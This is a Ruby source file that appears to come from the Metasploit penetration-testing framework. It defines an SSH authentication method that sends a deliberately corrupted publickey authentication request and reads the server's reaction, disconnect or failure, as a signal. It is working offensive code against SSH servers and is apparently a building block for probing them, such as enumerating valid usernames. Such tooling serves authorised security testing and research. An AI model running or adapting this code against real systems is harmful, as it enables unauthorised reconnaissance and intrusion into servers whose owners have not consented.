# -*- coding: binary -*-

module Msf::Exploit::Remote::SSH
module AuthMethods
module MalformedPacket

  #
  # https://tools.ietf.org/rfc/rfc4252.txt
  # https://tools.ietf.org/rfc/rfc4253.txt
  #
  class Net::SSH::Authentication::Methods::MalformedPacket < Net::SSH::Authentication::Methods::Abstract
    def authenticate(service_name, username, password = nil)
      debug { 'Sending SSH_MSG_USERAUTH_REQUEST (publickey)' }

      # Corrupt everything after auth method
      send_message(userauth_request(
=begin
        string    user name in ISO-10646 UTF-8 encoding [RFC3629]
        string    service name in US-ASCII
        string    "publickey"
        boolean   FALSE
        string    public key algorithm name
        string    public key blob
=end
        username,
        service_name,
        'publickey',
        Rex::Text.rand_text_english(8..42)
      ))

      # SSH_MSG_DISCONNECT is queued
      begin
        message = session.next_message
      rescue Net::SSH::Disconnect
        debug { 'Received SSH_MSG_DISCONNECT' }
        return true
      end

      if message && message.type == USERAUTH_FAILURE
        debug { 'Received SSH_MSG_USERAUTH_FAILURE' }
        return false
      end

      # We'll probably never hit this
      false
    end
  end

end
end
end
